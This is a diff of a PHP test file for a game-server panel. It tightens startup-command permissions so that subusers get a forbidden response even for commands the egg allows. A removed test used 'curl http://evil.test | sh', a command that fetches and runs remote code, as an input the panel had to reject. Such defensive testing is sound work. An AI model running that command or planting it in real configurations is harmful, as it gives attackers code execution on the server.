@@ -66,7 +66,8 @@ it('updates a startup variable on the tenant server', function () {
     expect($variable->refresh()->variable_value)->toBe('changed');
 });
 
-it('allows selecting a startup command inside the egg allowlist', function () {
+// Shoebill: as in Pterodactyl, only admins change the startup command (from the admin panel).
+it('does not let server users change the startup command, even to one the egg allows', function () {
     [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
     $server->egg->forceFill(['startup_commands' => ['java -jar test.jar', 'java -jar other.jar']])->saveOrFail();
     $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();
@@ -76,22 +77,7 @@ it('allows selecting a startup command inside the egg allowlist', function () {
 
     livewire(Startup::class)
         ->set('data.startup_select', 'java -jar other.jar')
-        ->assertSuccessful();
-
-    expect($server->refresh()->startup)->toBe('java -jar other.jar');
-});
-
-it('rejects a startup command outside the egg allowlist', function () {
-    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
-    $server->egg->forceFill(['startup_commands' => ['java -jar test.jar']])->saveOrFail();
-    $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();
-
-    $this->actingAs($user);
-    Filament::setTenant($server);
-
-    livewire(Startup::class)
-        ->set('data.startup_select', 'curl http://evil.test | sh')
-        ->assertStatus(422);
+        ->assertForbidden();
 
     expect($server->refresh()->startup)->toBe('java -jar test.jar');
 });
